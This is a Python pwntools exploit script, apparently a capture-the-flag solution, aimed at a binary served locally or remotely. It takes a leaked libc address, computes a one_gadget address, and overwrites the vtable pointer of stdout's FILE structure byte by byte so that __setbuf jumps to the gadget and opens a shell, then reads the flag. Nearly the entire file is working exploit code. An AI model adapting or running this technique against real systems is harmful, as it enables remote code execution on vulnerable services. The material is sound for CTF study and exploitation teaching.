# -*- coding: utf-8 -*-
from pwn import *

g_fname = args.FNAME 
g_elf = ELF(g_fname)
context.binary = g_elf
g_libcname = args.LIB if (args.LIB) else "/lib/x86_64-linux-gnu/libc.so.6"

if (args.LOCAL):
	g_io = process(g_fname)
else:
    rhost, rport = args.REMOTE.split(":")
    g_io = remote(rhost, int(rport))

g_libc = ELF(g_libcname)

def getpid():
	if (args.LOCAL):
		log.info("PID: %d", g_io.proc.pid)
		pause()

s, sa, sl, sla = g_io.send, g_io.sendafter, g_io.sendline, g_io.sendlineafter
r, ru, rl = g_io.recv, g_io.recvuntil, g_io.recvline

def pwn():
    ru("here is a gift ")
    addr_sleep = int(ru(',', drop=True), 16)
    libc_base = addr_sleep - g_libc.symbols["sleep"]
    #one_gadget = libc_base + 0xf02a4
    #one_gadget = libc_base + 0xf0364 # libc-2.23.so of ubuntu16@local-docker
    #one_gadget = libc_base + 0xf1207 # libc-2.23.so of ubuntu16@local-docker
    one_gadget = libc_base + 0x4527a # libc-2.23.so of ubuntu16@local-docker
    log.debug("addr_sleep=%#x\n\tlibc@%#x\n\tone_gadget@%#x"
        , addr_sleep
        , libc_base
        , one_gadget
    )
    ru("good luck ;)")

    g_libc.address = libc_base
    addr_stdout = g_libc.symbols["_IO_2_1_stdout_"]
    addr_fake_vtb = addr_stdout + 9*8
    for i in range(2):
        s(p64(addr_stdout + 0xd8 + i))
        s(p64(addr_fake_vtb)[i:i+1])

    getpid()
    # target is __setbuf
    addr_target = addr_fake_vtb + 11*8
    for i in range(3):
        s(p64(addr_target + i))
        s(p64(one_gadget)[i:i+1])

    #sl("exec /bin/sh 1>&0")
    sl("cat flag 1>&0")
    

if ("__main__" == __name__):
	if (args.DEBUG):
		context.log_level = "debug"
	pwn()
	g_io.interactive()
